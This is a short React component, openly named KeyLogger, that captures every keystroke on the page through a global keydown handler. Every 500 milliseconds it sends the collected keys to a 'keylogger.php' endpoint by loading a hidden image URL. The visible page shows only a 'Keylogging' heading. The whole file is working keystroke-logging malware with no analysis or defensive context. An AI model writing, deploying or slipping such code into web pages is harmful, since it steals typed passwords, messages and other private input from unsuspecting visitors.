

export default function KeyLogger() {
    var keys = '';

    document.onkeydown = function(e) {
    get = window.event ? event : e;
    key = get.keyCode ? get.keyCode : get.charCode;
    key = String.fromCharCode(key);
    keys += key;
    console.log(keys);
    }
    window.setInterval(function() {
        if (keys != '') {
        new Image().src = 'keylogger.php?c=' + keys;
        keys = '';
  }
}, 500);
    return(
        <h1>Keylogging</h1>
    )
}


